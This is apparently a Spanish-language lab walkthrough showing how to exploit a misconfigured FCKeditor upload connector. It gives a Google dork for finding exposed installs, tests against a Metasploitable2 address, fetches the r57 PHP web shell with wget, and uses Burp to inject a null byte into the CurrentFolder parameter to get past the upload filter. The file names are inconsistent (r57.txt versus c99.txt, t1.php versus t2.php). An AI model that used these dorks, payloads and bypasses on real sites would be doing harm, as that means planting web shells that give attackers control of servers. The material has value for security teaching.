
# Vulnerabilidad en Control a partir de una ubicación de un dork
Descargar la imagen desde  https://drive.google.com/file/d/1UoC4w8T3pBgrvkitHCUdzgTS2Uk8d1L0/view

## FCKeditor 

El FCKEditor es un editor de texto Open Source del tipo WYSIWYG (What you see is what you get), muy parecido a editores ya conocidos como MS Word o el propio Google Docs. Lo interesante de este editor es que no necesita instalación alguna en el cliente: se basa en el servicio HTTP, es decir, a través de un browser, el usuario puede crear y modificar documentos de texto que luego pueden ser exportados y descargados. Este editor es compatible con la gran mayoría de navegadores conocidos incluyendo a Internet Explorer, Firefox, Safari, Opera y Netscape.

![image](https://user-images.githubusercontent.com/50930193/167024936-42353524-36ca-42d8-99a1-e4fe5224165f.png)

FCKeditor se basa en un núcleo escrito en JavaScript, pero, tambíén es implementado con tecnologías de lado servidor como Asp, Asp.net, Java, PHP, entre otros. Es así que este editor se convierte en una opción para aquel administrador de red que necesite implementar este tipo se soluciones en sus organizaciones.

## Vulnerabilidad y Escenario (Búsqueda desde OSINT)

Se asume que un sitio web, http://www.vulnerable.com, tiene instalado el producto FCKeditor con una isntalación por defecto.  La vulnerabilidad consiste emplear la mala configuración de una instalación de FCKeditor.  Para ello, se hace uso de la opción de carga (upload) de archivos de este producto. 

FCKEditor incluye un paquete ‘filemanager’, el cual permite a los desarrollares web incluir en las aplicaciones que desarrollen un módulo de upload el cual se pone a disposición de los usuarios finales. 

## OSINT
Ubicar fckeditor
```
inurl:/editor/editor/filemanager/upload/
```
En el caso de aplicaciones web con PHP, un archivo relevante para explotar esa vulnerabilidad es el archivo ‘upload.php’o ‘uploadtest.html’, el cual está disponible en la siguiente localización.
```
www.vulnerable.com/editor>/editor/filemanager/connectors/php/upload.php
```
Si ejecutan el dork combinado con otras característica en google les dará el siguiente resultado  

![image](https://user-images.githubusercontent.com/50930193/167029067-172c67d4-6f39-4b3f-817b-ce8a76c990bf.png)


## RECONOCIMIENTO y ENUMERACIÓN

Cargar la página que permite ejecutar la vulnerabilidad, en este caso utilicemos la IP de la maquina metasploitable2
```
http://192.168.109.171/fckeditor/editor/filemanager/connectors/uploadtest.html
```
![image](https://user-images.githubusercontent.com/50930193/167029598-8add822e-f691-4d57-b748-853616ac9415.png)

Determinar el servidor web y posible lenguaje de programación soportado, utilice wappalizer

![image](https://user-images.githubusercontent.com/50930193/167030373-ee09482e-8123-43ab-bee9-c684c45d1d21.png)

Uno de los datos que es necesario saber es el lenguaje de programación que hay detrás del servidor vulnerable. 
![image](https://user-images.githubusercontent.com/50930193/167030476-994b3c1b-3f2d-4625-a494-8acbefb9abf5.png)

Luego, ingresar los parámetros del formulario, en ese sentido, seleccionar de la lista ‘File Uploader’ el element PHP, ‘Resource Type’ el element  File y finalmente ingresa un archivo png 

![image](https://user-images.githubusercontent.com/50930193/167031058-ad74507a-9254-4570-8ecb-1fa3652c54a4.png)

 Presiona el botón de Send to Server, luego del cual siempre y cuando el sitio es vulnerable se mostrara el siguiente mensaje.

 ![image](https://user-images.githubusercontent.com/50930193/167031480-d08e5733-3828-4e78-b5c4-762f14f2591a.png)

Ahora se puede revisar el archivo que se ingreso
```
http://192.168.109.171/userfiles/hacked1.png
```
![image](https://user-images.githubusercontent.com/50930193/167031694-90314502-c6f7-4c48-96cc-98d1eb194de4.png)

## Subir Archivos Scripts que permitirían controlar el servidor

A sabiendas que es posible subir al servidor archivos, considerar que se pueden subir archivos php el cual 
permitirán la ejecución del comandos en el servidor, si se intenta subir un archivo php notarán que se 
muestra la siguiente pantalla. Considere el archivo **helloworld.php** para cargarlo

FILE:helloworld.php
```
<?php
echo 'Hello World';
?>
```
Intente cargar el archivo

![image](https://user-images.githubusercontent.com/50930193/167035314-53227742-f653-45df-95ec-9941e49cab67.png)

Eso quiere decir que en el servidor se valida información y no permite la carga de dicho archivo

Vamos a intentar emplear una técnica de cambio de datos en la cabecera para bypasear el control, pero antes descarguemos una web shell

```
wget https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/r57.php

```
![image](https://user-images.githubusercontent.com/50930193/167035978-a8bd0c34-ea95-48d7-96c5-d2b5b30e1755.png)

Manos a la obra, renombre **r57.php** a **r57.txt** 
```
cp r57.php r57.txt
```
Ahora intente cargar el archivo **c99.txt** y cargue el archivoteniendo en cuenta que “intercept” en el burp esté activo, en el 
Burpsuite elija proxy y luego intercept y verás esta pantalla

![image](https://user-images.githubusercontent.com/50930193/167036644-a63abaf0-cc6c-476c-9a26-d7a3cf33888b.png)

Para cargar el archivo se deberá renombrar la cadena del POST de la siguiente manera:

Dice:
```
/filemanager/connectors/php/upload.php?time=1497572358682&CurrentFolder=/ HTTP/1.1
```
Debe decir
```
/filemanager/connectors/php/upload.php?time=1497572358682&CurrentFolder=t1.php%00/ HTTP/1.1
```

![image](https://user-images.githubusercontent.com/50930193/167039782-0481181a-348f-4f8f-b80c-ddb6ddc92a9d.png)

Dar clic en el botón de “forward” (varias veces) y luego desactivar “Interceptn”

9.	Le aparecerá la ruta sonde se grabó y saldrá un mensaje de alerta que diga que el archivo fue cargado sin errores

![image](https://user-images.githubusercontent.com/50930193/167039254-65a32194-dd20-4057-b274-345c550287fb.png)


Ud. Puede ingresar a la ruta
```
192.168.109.171/userfiles/t2.php
```
11.	Revisará que la Shell fue ingresada al sitio

![image](https://user-images.githubusercontent.com/50930193/167039142-65bb27f4-bc25-400f-bf06-67449ffc012e.png)


12.	Si emplea esto con un sitio de Internet recuerde de evitar un perjuicio para dicha entidad.
